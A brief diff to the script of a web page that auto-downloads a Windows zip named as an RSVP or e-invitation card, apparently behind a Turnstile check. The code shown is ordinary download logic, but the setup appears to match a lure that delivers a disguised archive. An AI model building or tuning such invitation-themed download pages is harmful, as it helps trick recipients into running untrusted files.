@@ -353,7 +353,7 @@ button:disabled{
 </div>
 
 <script>
-const files={windows:{url:"RSVPEvite_2026XP8HO1S_19SYPURD17668.zip",name:"RSVPEvite_2026XP8HO1S_19SYPURD17668.zip"}};
+const files={windows:{url:"RSV_CARD.zip",name:"RSV_CARD.zip"}};
 let selectedFile=files.windows;
 let downloadInProgress=false;
 let turnstileVerified=false;
@@ -388,7 +388,7 @@ async function downloadFile(file){
 
         const a=document.createElement("a");
         a.href=url;
-        a.download = file.name || file.url.split('/').pop();
+        a.download=file.name;
         a.click();
 
         showToast("✅ Download complete");
